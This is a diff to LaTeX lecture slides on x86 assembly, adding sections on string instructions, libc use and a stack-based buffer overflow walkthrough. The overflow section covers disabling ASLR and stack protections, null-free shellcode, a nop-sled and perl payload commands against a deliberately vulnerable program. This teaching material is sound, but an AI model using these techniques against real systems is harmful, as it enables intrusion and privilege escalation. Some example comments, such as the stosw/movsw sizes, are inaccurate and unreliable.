@@ -16,6 +16,7 @@
 \usemintedstyle{perldoc}
 \newminted{c}{fontsize=\fontsize{9.25}{8.5},obeytabs=true}
 \newminted{gas}{fontsize=\fontsize{9.25}{8.5},obeytabs=true}
+\newminted{nasm}{fontsize=\fontsize{9.25}{8.5},obeytabs=true}
 \newminted{customobjdump}{fontsize=\fontsize{9.25}{8.5},obeytabs=true}
 \newminted{bash}{fontsize=\fontsize{9.25}{8.5},obeytabs=true}
 \newminted{text}{fontsize=\fontsize{9.25}{8.5},obeytabs=true}
@@ -283,10 +284,10 @@ f2 ae           repnz scas %es:(%edi),%al
         \pause
         \item glibc's \verb+strlen()+ "main loop" is only 2 bytes!
         \begin{itemize}
-                \item In fact, it's only two instructions: \verb+repnz scas (%edi),%al+.
+                \item In fact, it's only one instruction: \verb+repnz scas (%edi),%al+.
         \end{itemize}
         \pause
-        \item reasonable strlen's "main loop" is three instructions, with a conditional branch \verb+jne 0x80483c2+.
+        \item Reasonable strlen's "main loop" is three instructions, with a conditional branch \verb+jne 0x80483c2+.
         \pause
         \item No (obvious) gcc optimization will eliminate the three instruction critical loop with the conditional branch.
         \item glibc's i486 and i586 implementations of {\ttfamily strlen()} get complicated, taking into account memory alignment and processor pipeline
@@ -305,7 +306,7 @@ f2 ae           repnz scas %es:(%edi),%al
 
 \part{1}
 
-\section{Concept 1: Arithmetic and Data Transfer}
+\section{Topic 1: Arithmetic and Data Transfer}
 \begin{frame}[fragile,t]
 \frametitle{8086 CPU Registers}
 \begin{figure}
@@ -522,8 +523,9 @@ qword & 64-bits & q \\
 \end{center}
 \end{frame}
 
-\section{Concept 2: Flow Control}
+\section{Topic 2: Flow Control}
 \begin{frame}[fragile,t]
+\mvs
 \frametitle{Instruction Side-Effects}
 \begin{itemize}
   \item Certain instructions will set boolean bit flags in the {\ttfamily \%eflags} registers based on the result
@@ -532,8 +534,11 @@ qword & 64-bits & q \\
     \item Intentionally, with {\ttfamily cmp} or {\ttfamily test} between two operands
   \end{itemize}
 \end{itemize}
+\mvs
 \begin{figure}
 \centering
+  \includegraphics[width=\textwidth]{figures/eflags.png} \\
+  \vs
   \includegraphics[height=0.4\paperheight]{figures/ia32-eflags.png}\footnote{Intel 64 and IA-32 Architectures Software Developer’s Manual Vol. 1, A-1}
 \end{figure}
 \end{frame}
@@ -761,7 +766,7 @@ $
 \end{itemize}
 \end{frame}
 
-\section{Concept 3: Program Memory}
+\section{Topic 3: Program Memory}
 
 \begin{frame}[fragile,t]
 \frametitle{Static Allocation in C}
@@ -934,7 +939,7 @@ Idx Name          Size      VMA       LMA       File off  Algn
 \end{textcode*}
 \end{frame}
 
-\section{Concept 4: Reading/Writing Memory}
+\section{Topic 4: Reading/Writing Memory}
 
 \begin{frame}[fragile,t]
 \frametitle{Directly Accessing Memory}
@@ -1178,7 +1183,7 @@ $
 \end{textcode}
 \end{frame}
 
-\section{Concept 5: Stack}
+\section{Topic 5: Stack}
 
 \begin{frame}[fragile,t]
 \frametitle{Automatic Allocation in C}
@@ -1202,9 +1207,13 @@ int main(void) {
 
 \begin{frame}[fragile,t]
 \frametitle{Automatic Allocation in Assembly}
+\begin{figure}
+\centering
+\includegraphics[height=0.4\paperheight]{figures/stackplain.png}
+\end{figure}
 \begin{itemize}
-  \item In assembly, we use {\ttfamily push} and {\ttfamily pop} instructions for allocation and deallocation on the stack
-  \item x86 stack is 
+  \item In assembly, we can dynamically allocate/deallocate memory on the stack with {\ttfamily push} and {\ttfamily pop} instructions, or direct arithmetic on {\ttfamily \%esp}
+  \item x86 stack is
   \begin{itemize}
     \item last-in-first-out
     \item descending
@@ -1318,7 +1327,7 @@ Disassembly of section .text:
 \end{customobjdumpcode}
 \end{frame}
 
-\section{Concept 6: Functions and cdecl Convention}
+\section{Topic 6: Functions and cdecl Convention}
 
 \begin{frame}[fragile,t]
 \frametitle{{\ttfamily call} and {\ttfamily ret}}
@@ -1451,7 +1460,6 @@ $ ./test
 
 \begin{frame}[fragile,t]
 \frametitle{{\ttfamily libc} Entry Point}
-\mvs
 \begin{itemize}
   \item When we link with {\ttfamily libc}, it provides its own {\ttfamily \_start} to do some initialization, which eventually will call {\ttfamily main}
   \item We provide a {\ttfamily main} and also a return back to libc with {\ttfamily ret} and a return value in {\ttfamily \%eax}
@@ -1579,7 +1587,7 @@ $
 \end{textcode}
 \end{frame}
 
-\section{Concept 7: Stack Frames}
+\section{Topic 7: Stack Frames}
 
 \begin{frame}[fragile,t]
 \frametitle{Where did that argument go?}
@@ -1726,7 +1734,7 @@ _start:
 \end{gascode*}
 \end{frame}
 
-\section{Concept 8: Command-line Arguments}
+\section{Topic 8: Command-line Arguments}
 
 \begin{frame}[fragile,t]
 \frametitle{argc and **argv on the stack}
@@ -1948,7 +1956,7 @@ $
 \end{textcode}
 \end{frame}
 
-\section{Concept 9: System Calls}
+\section{Topic 9: System Calls}
 
 \begin{frame}[fragile,t]
 \frametitle{The User Program Condition}
@@ -1997,7 +2005,7 @@ $
   \pause
   \item Operating System specific convention for making a system call
   \item On Linux it is:
-  \begin {itemize}
+  \begin{itemize}
     \item system call number in {\ttfamily \%eax}
     \item arguments in order {\ttfamily \%ebx, \%ecx, \%edx, \%esi, \%edi}
     \item invoke software interrupt with vector {\ttfamily 0x80}: {\ttfamily int \$0x80}
@@ -2252,9 +2260,9 @@ putbyte:
 putchar:
     # Save %ebx
     pushl %ebx
-    # syscall write(0, c, 1);
+    # syscall write(1, c, 1);
     movl $0x04, %eax
-    movl $0, %ebx
+    movl $1, %ebx
     leal 8(%esp), %ecx
     movl $1, %edx
     int $0x80
@@ -2292,21 +2300,969 @@ $
 
 \part{2}
 
-\section{Advanced Concept 10: x86 String Operations}
+\section{Advanced Topic 10: x86 String Operations}
 
-\section{Advanced Concept 11: x86 Extensions}
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Special Instructions for {\ttfamily \%esi} and {\ttfamily \%edi}}
+\begin{itemize}
+  \item We've seen {\ttfamily push} and {\ttfamily pop} instructions which manipulate {\ttfamily \%esp} in a special way
+  \item Special string instructions exist for {\ttfamily \%esi} and {\ttfamily \%edi}
+  \begin{itemize}
+    \item {\ttfamily \%esi} is the source string pointer
+    \item {\ttfamily \%edi} is the destination string pointer
+  \end{itemize}
+  \pause
+  \item {\ttfamily movs} does {\ttfamily *\%edi++ = *\%esi++}
+  \item {\ttfamily cmps} does {\ttfamily cmp \%esi++, \%edi++}
+  \item {\ttfamily scas} does {\ttfamily cmp \%eax, \%edi++}
+  \item {\ttfamily lods} does {\ttfamily movl \%esi++, \%eax}
+  \item {\ttfamily stos} does {\ttfamily movl \%eax, \%edi++}
+  \pause
+  \vs
+  \item Instruction size suffix {\ttfamily b, w, l} determines copy, compare, move size and post-increment amount (1, 2, 4)
+  \item DF flag in {\ttfamily \%eflags} determines if it is a \\ post-increment (DF=0) or post-decrement (DF=1)
+\end{itemize}
+\end{frame}
 
-\section{Advanced Concept 12: Role of libc}
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example 1 of String Instructions (example-15.S)}
+\begin{gascode}
+.section .text
+_start:
+cld               # Clear DF, we want to post-increment
 
-\section{Advanced Concept 13: Stack-based Buffer Overflows}
+# Load str1 with 8 of 0xff
+movl $str1, %edi  # Set up our string destination pointer
 
-\section{Advanced Concept 14: Comparisons with AVR and ARM}
+# Load the first four a byte at a time
+movb $0xFF, %al
+stosb             # *(%edi++) = %al
+stosb             # *(%edi++) = %al
+stosb             # *(%edi++) = %al
+stosb             # *(%edi++) = %al
 
-\section{Advanced Concept 15: Comments on x86}
+# Load the last four with a single dword
+movl $0xFFFFFFFF, %eax
+stosw             # *(%edi) = %eax, %esi += 4
 
-\section{Extra Concept 1: Intel/nasm Syntax}
+# Copy str1 to str2
+movl $str1, %esi  # str1 in the source
+movl $str2, %edi  # str2 in the destination
+# Two dword moves copies all 8 bytes
+movsw
+movsw
+# Done!
+\end{gascode}
+\end{frame}
 
-\section{Extra Concept 2: x86-64 Assembly}
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example 1 of String Instructions (example-15.S) Continued}
+\begin{gascode}
+.section .bss
+.comm str1, 8
+.comm str2, 8
+\end{gascode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Repeat Prefix for String Instructions}
+\begin{itemize}
+  \item String instructions can be prefixed by \\ {\ttfamily rep, repe/repz, repne/repnz}
+  \item {\ttfamily rep <string instr>}
+  \begin{itemize}
+    \item repeat the string instruction until {\ttfamily \%ecx} is 0
+  \end{itemize}
+  \item {\ttfamily repe/repz <string instr>}
+  \begin{itemize}
+    \item repeat the string instruction until {\ttfamily \%ecx} is 0 or ZF flag is 0
+  \end{itemize}
+  \item {\ttfamily repne/repnz <string instr>}
+  \begin{itemize}
+    \item repeat the string instruction until {\ttfamily \%ecx} is 0 or ZF flag is 1
+  \end{itemize}
+  \item {\ttfamily \%ecx} automatically decremented for you
+  \vs
+  \pause
+  \item Simple {\ttfamily memset()}: {\ttfamily rep stosb}
+  \item Simple {\ttfamily memcpy()}: {\ttfamily rep movsb}
+  \item Simple {\ttfamily strlen()}: {\ttfamily repne scasb}
+  \item Simple {\ttfamily strncmp()}: {\ttfamily repe cmpsb}
+  \item Can be better optimized for memory alignment and scan/copy size
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example 2 of String Instructions (example-16.S)}
+\begin{gascode}
+.section .text
+.global main
+main:
+  # memset(str, 'A', 98);
+  pushl $48
+  pushl $'A 
+  pushl $str
+  call asm_memset
+  addl $12, %esp
+
+  # str[48] = '\n'; str[49] = '\0';
+  movb $'\n', str+48
+  movb $0, str+49
+
+  # printf(str);
+  pushl $str
+  call printf
+  addl $4, %esp
+
+  ret
+\end{gascode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example 2 of String Instructions (example-16.S) Continued}
+\begin{gascode}
+# void *memset(void *s, int c, size_t n);
+asm_memset:
+  pushl %edi
+  pushl %ebp
+  movl %esp, %ebp
+
+  movl 12(%ebp), %edi    # %eid = s
+  movl 16(%ebp), %eax    # %eax = c
+  movl 20(%ebp), %ecx    # %ecx = n
+
+  rep stosb
+
+  movl 12(%ebp), %eax    # %eax = s
+
+  movl %ebp, %esp
+  popl %ebp
+  popl %edi
+  ret
+
+.section .bss
+.comm str, 50
+\end{gascode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example 2 of String Instructions (example-16.S) Runtime}
+\begin{textcode}
+$ as example-16.S -o example-16
+$ gcc example-16.o -o example-16
+$ ./example-16
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$
+\end{textcode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Back to the opening glibc strlen example}
+\begin{customobjdumpcode}
+080483cd <glibc_strlen>:
+ 80483cd: 57                    push   %edi
+
+ 80483ce: b9 ff ff ff ff        mov    $0xffffffff,%ecx
+ 80483d3: b8 00 00 00 00        mov    $0x0,%eax
+ 80483d8: 8b 7c 24 08           mov    0x8(%esp),%edi
+
+ 80483dc: fc                    cld    
+ 80483dd: f2 ae                 repnz scas %es:(%edi),%al
+
+ 80483df: b8 fe ff ff ff        mov    $0xfffffffe,%eax
+ 80483e4: 29 c8                 sub    %ecx,%eax
+
+ 80483e6: 5f                    pop    %edi
+ 80483e7: c3                    ret
+\end{customobjdumpcode}
+\begin{itemize}
+  \item Trick is to load {\ttfamily \%ecx} with -1 or {\ttfamily 0xFFFFFFFF}
+  \item Assumption: string is not longer than 4 gigabytes
+  \item Reasonable assumption, compiler might not make it for you
+\end{itemize}
+\end{frame}
+
+\section{Advanced Topic 11: Three Simple Optimizations}
+
+\begin{frame}[fragile,t]
+\frametitle{Three Basic Optimizations}
+\mvs
+\begin{itemize}
+  \item Clear a register with {\ttfamily xor} rather than a {\ttfamily mov}
+\vspace{0.5em}
+\begin{customobjdumpcode}
+   0: a1 00 00 00 00        movl    $0x0,%eax
+
+   0: 31 c0                 xorl    %eax,%eax
+\end{customobjdumpcode}
+\vspace{0.5em}
+  \item Use {\ttfamily lea} for general purpose arithmetic when applicable
+  \begin{itemize}
+    \item {\ttfamily lea} calculates the indirect memory address \\ {\ttfamily \%reg + \%reg*(1,2,4,8) + \$constant} \\ and stores the effective address without dereferencing memory
+  \end{itemize}
+\vspace{0.5em}
+\begin{gascode}
+  # Compute expression: %eax + %ebx*2 + 10
+  leal 10(%eax, %ebx, 2), %eax
+\end{gascode}
+  \item Use a more efficient loop structure when possible
+\mvs
+\begin{columns}[T]
+\column{0.5\textwidth}
+\begin{gascode}
+# for (i = 0; i < 10; i++) { ; }
+xorl %ecx, %ecx
+loop:
+  cmpl $10, %ecx
+  jge loop_done
+  nop
+  incl %ecx
+  jmp loop
+loop_done:
+\end{gascode}
+\column{0.5\textwidth}
+\begin{gascode}
+# i = 10; do { ; } while(--i != 0);
+movl $10, %ecx
+loop:
+  nop
+  decl %ecx
+  jnz loop
+\end{gascode}
+\end{columns}
+\end{itemize}
+\end{frame}
+
+\section{Advanced Topic 12: x86 Extensions}
+
+\begin{frame}[fragile,t]
+\frametitle{Overview}
+\begin{itemize}
+  \item Separate instruction sets
+  \item x87 floating point unit
+  \begin{itemize}
+    \item 80-bit double-extended precision registers
+    \item add, subtract, multiply, divide, square root, round, cosine, sine, compare, load/store, etc. for floating point numbers
+  \end{itemize}
+  \pause
+  \item Single Instruction Multiple Data (SIMD) instruction sets \\ like MMX, SSE, SSE2, SSE3, SSE4, ...
+  \begin{itemize}
+    \item Parallel gain in that a single instruction carries out an operation (add, subtract, etc.) across multiple data blocks in parallel
+    \item MMX was a SIMD instruction set for integers
+    \pause
+    \item SSE is SIMD instruction set for integers and floating point
+    \pause
+    \item SSE1 had 32-bit single precision floating point support 
+    \item SSE2 added 64-bit double precision floating point support
+    \pause
+    \item SSE registers are {\%xmm0 - \%xmm7}, each 128-bit
+    \item SSE instructions can treat a register as multiple floats, doubles, chars, shorts, etc.
+  \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Scalar versus SIMD}
+\begin{figure}
+\centering
+\includegraphics[width=\textwidth]{figures/simd.png}
+\footnote{\url{http://software.intel.com/en-us/articles/introduction-to-intel-advanced-vector-extensions/}}
+\end{figure}
+\end{frame}
+
+\section{Advanced Topic 13: Role of libc}
+
+\begin{frame}[fragile,t]
+\frametitle{{\ttfamily libc} for library functions and system calls}
+\begin{itemize}
+  \item {\ttfamily libc} provides optimized string, formatting, pattern matching, math, date and time, etc. computation functions
+  \item {\ttfamily libc} wraps system calls and provides more-so platform independent data structures and interfaces
+  \begin{itemize}
+    \item file streams: {\ttfamily FILE *, fopen(), fclose(), fread(), fwrite()}
+    \item sockets: {\ttfamily socket(), bind(), accept(), send(), recv()}
+  \end{itemize}
+  \item In other words, {\ttfamily libc} implements the C library of the POSIX standard
+  \vs
+  \vs
+  \pause
+  \item All accessible in assembly when linking with {\ttfamily libc}
+  \item Follow {\ttfamily cdecl} calling convention
+  \item You can choose not to link with libc, only use syscalls, and implement the other functionality yourself (interesting challenge)
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example of using libc in Assembly (example-17.S)}
+\begin{gascode}
+.section .text
+.global main
+main:
+  # time(NULL);
+  pushl $0
+  call time
+  add $4, %esp
+
+  # curtime = %eax
+  movl %eax, curtime
+
+  # localtime(%eax);
+  pushl $curtime
+  call localtime
+  add $4, %esp
+
+  # asctime(%eax);
+  pushl %eax
+  call asctime
+  add $4, %esp
+\end{gascode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\mvs
+\frametitle{Example of using libc in Assembly (example-17.S) Continued}
+\begin{gascode}
+  # printf("%s\n", %eax);
+  pushl %eax
+  pushl $formatStr
+  call printf
+  add $8, %esp
+
+  ret
+
+.section .data
+.comm curtime, 4
+formatStr:  .ascii "%s\0"
+\end{gascode}
+{\small Runtime:}
+\begin{textcode}
+$ as example-17.S -o example-17.o
+$ gcc example-17.o -o example-17
+$ ./example-17
+Wed Jan 25 16:13:27 2012
+$
+\end{textcode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{{\ttfamily libc} for dynamic memory management (heap)}
+\begin{columns}[T]
+\column{0.7\textwidth}
+\begin{itemize}
+  \item Operating system allocates heap memory for user program
+  \item {\ttfamily libc} {\ttfamily malloc()} and {\ttfamily free()} manages allocations, deallocations, fragmentation of the heap
+  \item Heap grows up, stack grows down
+\end{itemize}
+\column{0.3\textwidth}
+\includegraphics[height=0.70\paperheight]{figures/memlayoutvm.png}
+\end{columns}
+\end{frame}
+
+\section{Advanced Topic 14: Stack-based Buffer Overflows}
+
+\begin{frame}[fragile,t]
+\frametitle{Classic Insecure Example in C (example-18.c)}
+\begin{ccode}
+#include <stdio.h>
+
+void get_input(void) {
+  char buff[100];
+  gets(buff);
+}
+
+int main(void) {
+  printf("input: ");
+  get_input();
+  return 0;
+}
+\end{ccode}
+\vs
+\begin{textcode}
+$ gcc -fno-stack-protector -z execstack example-18.c -o example-18
+\end{textcode}
+\begin{itemize}
+\item We'll build this the GCC stack protector disabled and executable stack (for reasons explained in a few slides)
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Disassembly of {\ttfamily get\_input()}}
+\mvs
+\begin{ccode}
+void get_input(void) {
+  char buff[100];
+  gets(buff);
+}
+\end{ccode}
+\vs
+\begin{customobjdumpcode}
+$ objdump -D example-18
+08048414 <get_input>:
+                              # Function prologue
+ 8048414: 55                  push   %ebp
+ 8048415: 89 e5               mov    %esp,%ebp
+                              # Space allocated on the stack for buff[100]
+ 8048417: 81 ec 88 00 00 00   sub    $0x88,%esp
+                              # Address of buff in %eax
+ 804841d: 8d 45 94            lea    -0x6c(%ebp),%eax
+                              # Pushing &buff onto the stack
+ 8048420: 89 04 24            mov    %eax,(%esp)
+                              # gets(buff);
+ 8048423: e8 f8 fe ff ff      call   8048320 <gets@plt>
+                              # Function epilogue
+ 8048428: c9                  leave  
+ 8048429: c3                  ret 
+\end{customobjdumpcode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Stack Frame of get\_input()}
+\mvs
+\begin{gascode*}{textsize=\textsize{8.5}{8}}
+# Function prologue
+push   %ebp
+mov    %esp,%ebp
+# Space allocated on the stack for buff[100]
+sub    $0x88,%esp
+# Address of buff in %eax
+lea    -0x6c(%ebp),%eax
+# Pushing &buff onto the stack
+mov    %eax,(%esp)
+# gets(buff);
+call   8048320 <gets@plt>
+# Function epilogue
+leave
+ret
+
+# Stack frame right before call to gets()
+# |    ...    |
+# |  retaddr  |
+# | saved ebp |
+# |    buf    |
+# |    buf    |
+#       .
+# |    buf    |
+# |    buf    |
+# |   &buf    | <- %esp
+\end{gascode*}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Buffer Overflow}
+\mvs
+\begin{itemize}
+  \item With a well-crafted buffer, we can inject instructions into the buffer on the stack as well as an over-written return address to those instructions
+  \item When {\ttfamily get\_input()} returns, it will return to our injected instructions
+\end{itemize}
+\begin{figure}
+\centering
+\includegraphics[height=0.60\paperheight]{figures/bufferoverflow.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Overwriting the Return Address}
+\mvs
+\begin{itemize}
+  \item But how do we pick the return address? What is the address of stuff on the stack anyway?
+  \pause
+  \item Let's write a small program to find out...
+\end{itemize}
+\begin{ccode}
+#include <stdio.h>
+int main(void) {
+  char c;
+  printf("%x\n", &c);
+  return 0;
+}
+\end{ccode}
+\begin{textcode}
+$ gcc example-19.c -o example-19
+$ ./example-19
+bfe3d16f
+$ ./example-19
+bfdef6ff
+$ ./example-19
+bfefbecf
+\end{textcode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Address Space Layout Randomization (ASLR)}
+\begin{itemize}
+  \item We just witnessed the effect of ASLR, which randomly initializes the position of code, libraries, heap, and stack in a user program's address space
+  \item However, the addresses were all relatively close to each other, so there is an opportunity for guessing...
+  \item For our purposes, let's turn off ASLR.
+\end{itemize}
+\vs
+\begin{textcode}
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+$ ./example-19
+bffff28f
+$ ./example-19
+bffff28f
+$ ./example-19
+bffff28f
+\end{textcode}
+\begin{itemize}
+  \item Now we have an idea of where variables on the stack live
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Shellcode}
+\begin{itemize}
+  \item Next step is to write our instructions to inject
+  \item Often called shellcode, because it often spawns a privileged shell
+  \pause
+  \vs\vs
+  \item Must be position-independent
+  \begin{itemize}
+    \item Code cannot rely on absolute addresses for its data, since we're not sure exactly where it will live on the stack
+  \end{itemize}
+  \pause
+  \item Must contain no newlines, and in other cases, no null bytes
+  \begin{itemize}
+    \item Otherwise {\ttfamily gets()} will stop reading input prematurely
+  \end{itemize}
+  \pause
+  \vs
+  \item Let's make it do {\ttfamily write(1, "Hello!", 6);} and {\ttfamily exit(0);}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Hello Shellcode Take 1 (example-20.S)}
+\mvs
+\begin{gascode}
+# Clever way to get our own address
+jmp get_str_addr
+got_str_addr:
+popl %ecx
+
+# write(1, "Hello!", 6);
+movl $0x04, %eax
+movl $0x01, %ebx
+movl $6, %edx
+int $0x80
+# exit(0);
+movl $0x01, %eax
+# %ebx already zero from above
+int $0x80
+
+get_str_addr:
+call got_str_addr
+.ascii "Hello!"
+\end{gascode}
+\begin{textcode}
+$ as example-20.S -o example-20.o
+$ ld example-20.o -o example-20
+$ ./example-20
+Hello!$
+\end{textcode}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Hello Shellcode Take 1 (example-20.S) Disassembly}
+\mvs
+\begin{customobjdumpcode}
+$ objdump -D example-20
+Disassembly of section .text:
+08048054 <_start>:
+ 8048054: eb 19                 jmp    804806f <get_str_addr>
+08048056 <got_str_addr>:
+ 8048056: 59                    pop    %ecx
+ 8048057: b8 04 00 00 00        mov    $0x4,%eax
+ 804805c: bb 01 00 00 00        mov    $0x1,%ebx
+ 8048061: ba 06 00 00 00        mov    $0x6,%edx
+ 8048066: cd 80                 int    $0x80
+ 8048068: b8 01 00 00 00        mov    $0x1,%eax
+ 804806d: cd 80                 int    $0x80
+0804806f <get_str_addr>:
+ 804806f: e8 e2 ff ff ff        call   8048056 <got_str_addr>
+ 8048074: 48                    dec    %eax
+ 8048075: 65                    gs
+ 8048076: 6c                    insb   (%dx),%es:(%edi)
+ 8048077: 6c                    insb   (%dx),%es:(%edi)
+ 8048078: 6f                    outsl  %ds:(%esi),(%dx)
+ 8048079: 21                    .byte 0x21
+\end{customobjdumpcode}
+\begin{itemize}
+  \item We want to get rid of those null bytes...
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Hello Shellcode Take 2 (example-21.S)}
+\mvs
+\begin{gascode*}{textsize=\textsize{9}{8}}
+# Clever way to get our own address
+jmp get_str_addr
+got_str_addr:
+popl %ecx
+
+# write(1, "Hello!", 6);
+xorl %eax, %eax
+xorl %ebx, %ebx
+xorl %edx, %edx
+incl %ebx
+addb $4, %al 
+addb $6, %dl 
+int $0x80
+# exit(0);
+xorl %eax, %eax
+incl %eax
+# %ebx already zero from above
+int $0x80
+
+get_str_addr:
+call got_str_addr
+.ascii "Hello!"
+\end{gascode*}
+\begin{textcode*}{textsize=\textsize{9}{8}}
+$ as example-21.S -o example-21.o
+$ ld example-21.o -o example-21
+$ ./example-21
+Hello!$
+\end{textcode*}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Hello Shellcode Take 2 (example-21.S) Disassembly}
+\mvs
+\begin{customobjdumpcode}
+$ objdump -D example-21
+Disassembly of section .text:
+08048054 <_start>:
+ 8048054: eb 14                 jmp    804806a <get_str_addr>
+08048056 <got_str_addr>:
+ 8048056: 59                    pop    %ecx
+ 8048057: 31 c0                 xor    %eax,%eax
+ 8048059: 31 db                 xor    %ebx,%ebx
+ 804805b: 31 d2                 xor    %edx,%edx
+ 804805d: 43                    inc    %ebx
+ 804805e: 04 04                 add    $0x4,%al
+ 8048060: 80 c2 06              add    $0x6,%dl
+ 8048063: cd 80                 int    $0x80
+ 8048065: 31 c0                 xor    %eax,%eax
+ 8048067: 40                    inc    %eax
+ 8048068: cd 80                 int    $0x80
+0804806a <get_str_addr>:
+ 804806a: e8 e7 ff ff ff        call   8048056 <got_str_addr>
+ 804806f: 48                    dec    %eax
+ 8048070: 65                    gs
+ 8048071: 6c                    insb   (%dx),%es:(%edi)
+ 8048072: 6c                    insb   (%dx),%es:(%edi)
+ 8048073: 6f                    outsl  %ds:(%esi),(%dx)
+ 8048074: 21                    .byte 0x21
+\end{customobjdumpcode}
+\begin{itemize}
+  \item No null bytes or newlines!
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile,t]
+\frametitle{Preparing our Payload}
+\begin{itemize}
+  \item Reading off the {\ttfamily objdump} disassembly, we can write out the instructions as an ASCII string with escape characters
+\end{itemize}
+\begin{textcode}
+"\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43\x04\x04\x80\xc2\x06\xcd
+\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff\x48\x65\x6c\x6c\x6f\x21"
+\end{textcode}
+\pause
+\begin{itemize}
+  \item So the plan is to pass a string to the insecure example with the shellcode, enough A's to overflow the buff, and a new return address
+\pause
+  \item But if the return address isn't exactly right, it won't work!
+\pause
+  \item We can make it more robust by adding a \textbf{nop-sled}: a bunch of nops preceding our shellcode
+  \item Even if our guessed return address is off by a couple of bytes, as long as the CPU returns to somewhere within the nop-sled, execution will slide down to our real injected instructions
+  \item Machine code for a {\ttfamily nop} is {\ttfamily 0x90}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{The Actual Exploit...}
+\mvs
+\begin{itemize}
+  \item First, find out how many A's it takes to break it...
+\end{itemize}
+\begin{textcode}
+$ perl -e 'print "A" x 107' | ./example-18
+input:
+$ perl -e 'print "A" x 108' | ./example-18
+input:
+Segmentation fault
+$
+\end{textcode}
+
+\begin{itemize}
+  \item Then, use gdb to find out the number of A's to start overwriting the return address...
+\end{itemize}
+
+\begin{textcode}
+$ gdb example-18
+...
+
+<input 113 A's>
+Program received signal SIGSEGV, Segmentation fault.
+0x08040041 in ?? ()
+\end{textcode}
+
+\begin{itemize}
+  \item Lower byte of return address, now \%eip, was overwritten by an 'A'.
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{The Actual Exploit... Continued}
+\mvs
+\begin{textcode*}{textsize=\textsize{8}{8}}
+Prepare small nop-sled, shellcode, A's, and return address that is
+116 characters long.
+
+$ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
+ \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x80\xf2\xff\xbf"' | wc
+      0       1     116
+
+Guess at the  return address, starting at 0xbffff280:
+$ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
+ \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x80\xf2\xff\xbf"' | ./example-18
+input:
+Segmentation fault
+
+$ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
+ \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x70\xf2\xff\xbf"' | ./example-18
+input:
+Illegal instruction
+
+$ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
+ \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x60\xf2\xff\xbf"' | ./example-18
+input:
+Hello!$
+\end{textcode*}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Closing Notes}
+\begin{itemize}
+  \item If vulnerable program was running as root, shellcode could spawn a root shell
+  \item If vulnerable program was suid root, shellcode could setuid(0) and then spawn a root shell
+  \pause
+  \item We had to disable three security mechanisms to allow the traditional stack-based buffer overflow to work.
+  \begin{itemize}
+    \item GCC Stack Protector \\ (disabled with {\small \ttfamily -fno-stack-protector} gcc option)
+    \item Non-Executable Stack \\ (disabled with {\small \ttfamily -z execstack} gcc option)
+    \item Address Space Layout Randomization \\ (disabled by writing 0 to {\small \ttfamily /proc/sys/kernel/randomize\_va\_space})
+  \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Security Mechanisms to Prevent Stack-based Buffer Overflows}
+\begin{itemize}
+  \item GCC Stack Protector
+  \begin{itemize}
+    \item GCC generates code to install a random guard value on the stack, below the saved frame pointer, and checks for its validity before the function returns
+    \item If the guard value is corrupted by a buffer overflow, the pre-return check will catch it
+  \end{itemize}
+  \pause
+  \item Non-Executable Stack
+  \begin{itemize}
+    \item NX page table entry bit introduced in x86-64 processors. Linux kernel uses them to mark the stack non-executable, so shellcode cannot execute from the stack
+  \end{itemize}
+  \pause
+  \item Address Space Layout Randomization
+  \begin{itemize}
